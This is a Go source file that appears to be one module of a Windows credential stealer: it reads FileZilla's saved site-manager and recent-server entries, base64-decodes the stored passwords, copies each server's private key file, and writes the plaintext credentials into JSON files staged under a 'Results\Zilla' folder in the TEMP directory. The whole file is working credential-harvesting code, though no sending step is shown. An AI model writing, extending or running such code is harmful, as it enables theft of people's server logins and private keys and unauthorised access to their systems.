package data

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"

	"github.com/equisde/Clean/core"
	"github.com/equisde/Clean/utils"
)

func HandleManagedServer(s core.SiteManagerList) (servers core.SavedServers) {
	servers.Servers = make(map[int][]core.Server)

	for index, server := range s.AllServers.Servers {
		pass, err := base64.StdEncoding.DecodeString(server.Pass)
		if err != nil {
			continue
		}
		server.Pass = string(pass)

		if len(server.Keyfile) != 0 {
			if worked := utils.CopyFile(fmt.Sprintf("%s\\Zilla\\%s.pem", tempPath, server.Host), server.Keyfile); worked {
				server.Keyfile = fmt.Sprintf("%s\\Zilla\\%s.pem", tempPath, server.Host)
			}
		}

		servers.Servers[index] = append(servers.Servers[index], server)
	}

	return servers
}

func HandleRecentServers(s core.RecentServerList) (servers core.SavedServers) {
	servers.Servers = make(map[int][]core.Server)

	for index, server := range s.AllServers.Servers {
		pass, err := base64.StdEncoding.DecodeString(server.Pass)
		if err != nil {
			continue
		}
		server.Pass = string(pass)

		servers.Servers[index] = append(servers.Servers[index], server)
	}

	return servers
}

func SaveBoth(s core.SiteManagerList, s2 core.RecentServerList) {
	var managed = HandleManagedServer(s)
	var recent = HandleRecentServers(s2)

	if len(managed.Servers) == 0 && len(recent.Servers) == 0 {
		os.RemoveAll(tempPath + "\\Zilla")
	}

	if len(managed.Servers) > 0 {
		utils.WriteJSON(fmt.Sprintf("%s\\Zilla\\Site Manager Servers.json", tempPath), managed)
	}

	if len(recent.Servers) > 0 {
		utils.WriteJSON(fmt.Sprintf("%s\\Zilla\\Recent Servers.json", tempPath), recent)
	}
}

var (
	tempPath = utils.CleanPath(filepath.Join(os.Getenv("TEMP"), "Results"))
)
